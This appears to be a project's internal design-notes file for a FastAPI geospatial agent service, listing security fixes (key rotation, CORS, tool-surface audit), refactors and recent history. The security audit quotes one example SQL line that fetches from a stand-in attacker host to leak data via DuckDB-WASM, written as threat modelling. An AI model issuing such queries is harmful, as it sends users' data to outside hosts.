# Design Notes & Planned Improvements

Living document. Architecture overview is in [architecture.md](architecture.md); HTTP surface is in [api_reference.md](api_reference.md). This file captures known weaknesses, refactor proposals, and ideas not yet ready for a ticket — so future contributors (and Claude sessions) can pick up the thread.

## Status legend

- 🔴 Security / correctness — should land soon
- 🟡 Code health — meaningful improvement, no user-visible change
- 🟢 Product / cross-repo — depends on other parts of the suite

---

## The sibyl split

The agent loop runs in **sibyl** (Rust, `../sibyl`, port 8090). GeoLang keeps the FastAPI app, the tools, the persona, the marker parsing, and the AG-UI rendering.

| Concern | Owner |
|---|---|
| LLM calls, tool-call loop, sessions, history | sibyl |
| Tool implementations, persona text, viewer protocol, file I/O | geolang |

The contract in both directions:

- `GET /tools` on geolang returns `{"tools": [{"name", "description", "parameters"}]}`, built from the modules under `src/agents/tools/`. `parameters` is `TOOL_SCHEMA.model_json_schema()`.
- `POST /tools/{name}` with `{"args": {...}}` runs the tool **in the geolang process** and returns `{"result": "<string>"}`. Validation errors and exceptions come back as `200` with a ❌ result so the agent can recover. The routes are sync `def`, so FastAPI runs them in its threadpool, tools block for minutes.
- `POST /runs` on sibyl takes `{"system_prompt", "message"}` and streams NDJSON events (`text`, `tool_call`, `tool_return`, `error`, `done`). `agent_event_stream` normalises those into the `(kind, payload)` tuples the AG-UI renderer consumes.

With `PLATFORM_JWT_SECRET` set, every route that runs code, writes a file, or reads back a session or a user's data requires a live HS256 platform token and answers `401` otherwise. `/health`, the `GET /tools` manifest, the static viewer, reading a share by id and reading a live layer by its token stay open. Unset, all of it is open.

There is no tool sandbox any more. A tool runs with the API's privileges, in its process, against the bind-mounted repo.

## 🔴 Rotate the API keys that were once committed to `docker-compose.yml`

`XAI_API_KEY` and `OPENAI_API_KEY` were committed as literals and are still in the git history. Treat them as leaked and rotate them at the provider console. Compose reads them from `.env` now. A `gitleaks` pre-commit hook would stop the next one.

## 🔴 Tighten CORS for any non-dev deployment

[`server.py`](../src/api/server.py) currently sets `allow_origins=["*"]`. Fine for `localhost` development. Before any internet-reachable deployment, the allow list must be narrowed to the actual ViewTopia / dashboard origins. Move the value to an env var (`CORS_ORIGINS`) with the wildcard as the dev default.

## 🔴 Audit the `viewer_control` and `sql_query` tool surface

Both let the LLM hand the browser arbitrary instructions. DuckDB-WASM is sandboxed in a Web Worker, but malicious SQL can still:

- `read_parquet('http://attacker.example/leak')` — DuckDB-WASM's HTTP fetcher inherits the page's CORS posture.
- Hammer arbitrary internal endpoints if the viewer is run on a corporate network.

**Plan:** lock down acceptable `viewer_control` actions to an enum; for `sql_query` consider an opt-in allowlist of domains that DuckDB may fetch from (configured at the viewer side, not the agent).

## 🟡 Decide what to do with `core/qgis_engine.py`

A 1-line stub after the `server.py` split. A `QGISEngine` class would only have value if multiple tools shared a common init pattern, and today they don't. Preference: delete it.

## 🟡 Move route bodies into `APIRouter` modules (Phase B of the split)

`server.py` is still ~990 lines, mostly route bodies. Reasonable next refactor:

```
src/api/
├── server.py            # app factory, lifespan, middleware, mount static — ~150 lines
├── routes/
│   ├── chat.py          # /chat/agui
│   ├── sessions.py      # /sessions/*
│   ├── datasets.py      # /datasets, /upload, /stats/*, /geojson/*
│   ├── outputs.py       # /outputs/*, /download/*
│   ├── share.py         # /share/*
│   ├── export.py        # /draw, /export-pdf, /export-png
│   └── debug.py         # /health, /debug/tools
```

The old blocker (a mutable `agent_id` global) is gone with the sibyl split, so the routes can move as-is. ~half a day of work.

## 🟡 Replace deprecated `@app.on_event("startup")` with lifespan

FastAPI deprecated the event hooks in favour of the `lifespan` context manager. The current code works but emits a deprecation warning under newer FastAPI versions. Wrap the existing startup body in an `@asynccontextmanager` and pass it to `FastAPI(lifespan=...)`.

## 🟡 Real health check

`GET /health` currently returns `{"status": "ok"}` regardless of whether sibyl is reachable. For load-balancer use, ping sibyl and return non-200 on failure. Keep a `/health/live` (always 200) vs `/health/ready` (dependency-aware) split.

## 🟡 Orphaned live layer data is never pruned

A layer too large to carry inside a live document is written to `live_data/` and
served open by its token. Republishing a layer now deletes the file the previous
entry named, once the replacing write is acked. Nothing else does: a member
deleting the layer, or the whole document going away, leaves the file in place
and fetchable forever, because agora never tells this service either happened.
Wanted: an age bound, or a token that expires with the document that named it.

## 🟡 Add a request log

There's no access log on the FastAPI side. When a chat fails (LLM 429, tool exception, sibyl timeout) we currently have only stdout traceback. Add a small middleware that logs method, path, status, and duration per request.

## 🟡 Deduplicate tool input parsing

Many tools under [`src/agents/tools/`](../src/agents/tools/) parse semicolon-separated lists, pipe-delimited specs, or address strings ad-hoc. A shared `parse_semicolon_list`, `parse_layer_spec`, and `split_addresses` helper module, imported by the tools, would deduplicate ~30 LOC and prevent splitter divergence.

## 🟡 The PERSONA prompt overlaps with tool docstrings

The PERSONA constant is ~9 KB and embeds tool-routing instructions ("when the user mentions travel time, use `calculate_isochrones`…"). Many of these are also in the tool docstrings, which sibyl sends as the tool descriptions. The result is duplicated guidance — costs tokens every turn and risks divergence when a tool is updated but PERSONA isn't.

**Plan:** keep PERSONA narrow (role, output style, error-recovery rules) and push routing hints into tool docstrings. Audit by removing one routing rule at a time and verifying behaviour.

## ✅ Surface the `sql_query` tool to the agent (done 2026-07)

`src/agents/tools/sql_query.py` emits the `sql_query` viewer command per the sketch in `viewer_integration.md`, with the "when NOT to use" guidance in the docstring and PERSONA. Landed together with the platform-service tools (`ptolemy_query`, `list_tilesets`), geokode-first `geocode_place`, itinera-first `compute_route`, and the QGIS sys.path fix that makes `run_qgis_algorithm` actually work (321 algorithms).

---

## Done (recently)

Keep a short history at the bottom so we can see the trajectory without diving into git.

- **2026-06**: Split `server.py` (1481 → 1043 lines). Extracted `core/utils.py`, `agents/agent_manager.py`, `agents/workflows.py`. Tool source unchanged — Letta sandbox sees identical code. Path issue uncovered: `TOOL_EXEC_DIR` default `~/src/geolang` was wrong for `GeoLang/geolang` checkouts; fixed by auto-detecting the repo root.
- **2026-06**: Added `viewer_integration.md` documenting the SSE `viewer_cmd` protocol and the upcoming `sql_query` tool that pairs with ViewTopia's DuckDB-WASM integration.
- **2026-06**: Populated `architecture.md` and `api_reference.md` (were empty stubs).
- **2026-07**: Replaced the embedded Letta server with sibyl. Deleted the tool registration and sandbox machinery, the tool-exec venv entrypoint, `.agent_id`, and `.sessions.json`. Tools now run in-process behind `/tools`. The image is a plain `python:3.11-slim-bookworm` with QGIS.
- **2026-07**: Added pytest coverage for the AG-UI renderers, the sibyl run stream, the session proxies, and the tool manifest/executor.
